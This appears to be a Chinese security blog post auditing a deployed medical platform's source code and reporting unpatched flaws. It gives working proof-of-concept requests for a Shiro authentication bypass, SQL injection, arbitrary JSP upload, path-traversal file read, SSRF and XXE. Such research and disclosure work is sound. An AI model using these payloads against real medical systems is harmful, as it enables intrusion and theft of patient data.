# 某医疗平台审计与0Day挖掘

> 来源：https://xz.aliyun.com/news/92462

# 介绍


某医疗平台，学员给的源码，资产还蛮多  

鹰图：  


![image.png](https://i.im.ge/QMfoKfL/p2m-d549d04149.png)

  


# 项目分析


通过web.xml和项目的配置文件分析，项目是spring MVC项目，鉴权采用shiro，前端采用html  


![image.png](https://i.im.ge/QMfo8J0/p2m-7932165bcc.png)

整体架构相对比较简单，也没配置额外的servlet，主要审计controller  


# 鉴权分析


项目采用shiro，那么分析的点主要如下：  

1鉴权绕过  

ashiro本身的版本漏洞，能否利用  

b是否有自定义鉴权实现然后覆盖默认的shiro鉴权逻辑，是否存在绕过  

2白名单路由提取  


![image.png](https://imglink.cc/cdn/a-Nfn-Qdvd.png)

  

项目的版本是1.5.3，符合的有  


| CVE | 影响版本 | 利用方式 |
| --- | --- | --- |
| CVE-2020-17523 | < 1.7.0 | /%2e/index.html 或 /../index.html（URL 编码的 .） |
| CVE-2021-41303 | < 1.8.0 | /static/..;/api/admin（; 路径参数） |
| CVE-2023-22602 | < 1.11.0 | /anon;/../admin（; 参数 + servlet path 解析不一致） |


然后项目其实采用的是自定义的filter覆盖shiro的默认filter，但是filter实现采用的还是shiro自带的鉴权逻辑，所以还是打历史漏洞，这里是实测符合CVE-2021-41303的利用条件，直接鉴权绕过，那么这里其实可以不去提取白名单路由了，但是这个修复比较简单，最好还是审前台能直接触发的接口  

查看配置文件看下白名单路由，也可以直接搜索anon  


![image.png](https://i.im.ge/QMfoZNc/p2m-3ccb47852c.png)

主要寻找带有`**`的泛规则，这里主要的是  

●/v3/\*\*  

●/api/\*\*/anon/\*\*  

●/app/\*\*/anon/\*\*  

这里可以直接使用正则去快速提取，这里演示个简单的，实际可以写个更准确的  

`@request.*?anon`  


![image.png](https://i.im.ge/QMfoWdT/p2m-17bc334901.png)

  

直接就可以快速匹配，这套系统的前台接口还挺多，还有一堆子接口  


# 漏洞审计

  

## sql注入


先判断是mybatis还是非mybatis的，通过搜索项目没有mybatis依赖和写法，那么就是JDBC一类的，找拼接，搜索where或者append，但是我自己手工审计的时候还是比较喜欢写正则，因为有的系统可能大部分接口都是预编译写法，只有少部分是拼接，但是在刚开始审计的时候没办法快速定位，我对于jdbc一类项目sql注入审计搜索的逻辑是  

先搜索常规查询看是否预编译——>编写正则搜索非预编译查询——>搜索常规无法直接预编译的写法——>寻找完全可控的sql执行功能  

大概是这样  


![image.png](https://i.im.ge/QMfofrG/p2m-6da434cd73.png)

  

例如这套，大部分sql操作接口都是预编译的写法，那么就可以根据写法编写筛选正则  

例如：`\.append\([^)]*\+[^)]*\)`  


![image.png](https://i.im.ge/QMfovIy/p2m-a6776e5b93.png)

  

当然这个正则是根据实际的情况去编写的，我一直觉得这种方式筛起来会很快，找到一处疑似注入后，分析总结特点，然后编写其余正则，我之前在大型项目中几千条sql操作找到为数不多的注入就是这样审的  

然后这套注入还蛮多的，我这里演示一处  

xxxxxReportService.java的find方法  


![image.png](https://i.im.ge/QMfoz8a/p2m-02a29ef54d.png)

  

这里方法传递keyWorld参数，然后只进行空判断，不为空则拼接进hql，跟进方法调用  

SysStoreReportController.java的find方法  


![image.png](https://i.im.ge/QMfok5x/p2m-ab0a9d3018.png)

  

通过路由参数传递，完全可控，存在注入  

然后接口是后台的要搭配我们前面审计的shiro版本绕过  

poc  

```
GET /static/..;/api/aaa/ccc/bbb/find?flag=condition&keyWorld=注入点
Host:
```

## 文件上传


这套系统的文件上传接口其实很多，但是有四种情况：  

1、保存本地但是落盘文件名是hash无后缀  

2、任意文件上传OSS  

3、上传也落盘但是有白名单无法绕过  

4、任意文件上传落盘本地无后缀限制  

当时给学员上课的时候现场审的只找到一处  

aaxxFileManagerController.java的fileUpload方法  


![image.png](https://i.im.ge/QMfopMJ/p2m-1e8d074f9f.png)

  

遍历表单上传的文件，然后new一个Upload，去赋值参数  

审计文件上传，1、先看是否有落盘操作，2、再看文件后缀是否可控，3、分析流是否有其余过滤或者不可控因素  


![image.png](https://i.im.ge/QMfoGPF/p2m-3d6e977cf5.png)

  

落盘文件文件名是uptemp.key加ext  


![image.png](https://i.im.ge/QMfonJz/p2m-cb70e33c4f.png)

key等于文件内容md5加密，重点关注文件后缀  


![image.png](https://i.im.ge/QMfoBd6/p2m-e7c2886d6e.png)

  

originalName是原始文件名，跟进extractFileExt方法  


![image.png](https://i.im.ge/QMfoJxS/p2m-030f9622c6.png)

就是简单的获取文件后缀，这里没有黑白名单判断，存在任意文件上传  


```
POST /static/..;/api/aaat/bbb/ccc/ddd/upload HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close

------WebKitFormBoundary
Content-Disposition: form-data; name="files"; filename="cmd.jsp"
Content-Type: application/octet-stream

111

------WebKitFormBoundary
Content-Disposition: form-data; name="lx"

..\
------WebKitFormBoundary--
```

## 文件读取


ccccController.java的getBImgs和getSImgs  

这里两个方法实现基本一致，就分析一个  


![image.png](https://i.im.ge/QMfoefK/p2m-328346ded8.png)

  

文件读取审计，先找读取的文件构造，这里是69行的filePath，filePath的实现在63，一个三元运算符，判断fileName是否有/然后拼接，这里是判断fileName是否是纯文件，如果有/就提取最后一个/后面的内容，也就是文件名，这里不重要因为拼接的文件路径fileMl是我们可控的，就是有个前条件61行会通过数据库查看文件路径，这里数据库种得有对应的数据，不然会报错  

poc：  

```
GET /static/..;/api/aaa/bbb/ccc?fileName=../../WEB-INF/web.xml&fileMl=/ HTTP/1.1
Host:
```

## SSRF


这套系统其实有很多处ssrf，但是都有http协议强转，我也是审了一坤分钟找到处没有协议限制的前台SSRF  

HttpUtils.java的getImage方法  


![image.png](https://i.im.ge/QMfXT9X/p2m-9ad1431a5f.png)

  

传参url然后构造发送请求，把回显数据存储到data，跟进调用  


![image.png](https://i.im.ge/QMfXQu9/p2m-7750909008.png)

  

url通过request.getParameter获取，然后getData输出到response中  

poc:  


```
GET /api/aaa/bbb/proxyimage?url=http://dnslog HTTP/1.1
Host:
```

## XXE


危险函数：DocumentHelper.parseText  

DBRelationsController.java的receiveEventNotifyFromDB方法  


![image.png](https://i.im.ge/QMfXo88/p2m-de87de25b0.png)

  

采用dom4j进行xml解析，项目的dom4j是低版本存在xxe漏洞，这里接收的xml代码直接通过路由参数传递  

poc:  


```
POST /aaa/vvv/ccc/fromdb/anon HTTP/1.1
Host:
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>
    <notifyType>&xxe;</notifyType>
    <tableName>test</tableName>
    <content>test</content>
    <desc>test</desc>
    <createDate>2026-07-08</createDate>
</root>
```
